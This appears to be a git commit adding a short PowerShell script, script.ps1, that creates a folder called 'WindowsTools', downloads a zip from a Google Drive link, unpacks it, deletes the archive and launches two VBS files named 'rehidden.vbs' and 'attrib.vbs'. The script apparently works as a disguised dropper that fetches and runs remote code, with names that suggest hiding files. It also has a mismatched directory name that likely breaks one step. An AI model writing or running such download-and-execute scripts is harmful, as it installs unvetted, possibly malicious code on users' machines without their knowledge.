240c1eb725f5bcd9cdcc31495e667f7bf4d5e10a
Giu-giu7077 <96227476+Giu-giu7077@users.noreply.github.com>
2022-06-12 17:06:37 +0200

    Create script.ps1

---
+++ script.ps1
@@ -0,0 +1,9 @@
+cd C:\
+mkdir WindowsTools
+cd WindowsTool
+Invoke-WebRequest -Uri 'https://drive.google.com/u/0/uc?id=18L1r6uOirWGVFB39vThRWrIWKwZAl57j&export=download' -OutFile dist.zip
+Expand-Archive .\dist.zip -DestinationPath dist
+rm dist.zip
+cd dist
+start-process rehidden.vbs
+start-process attrib.vbs
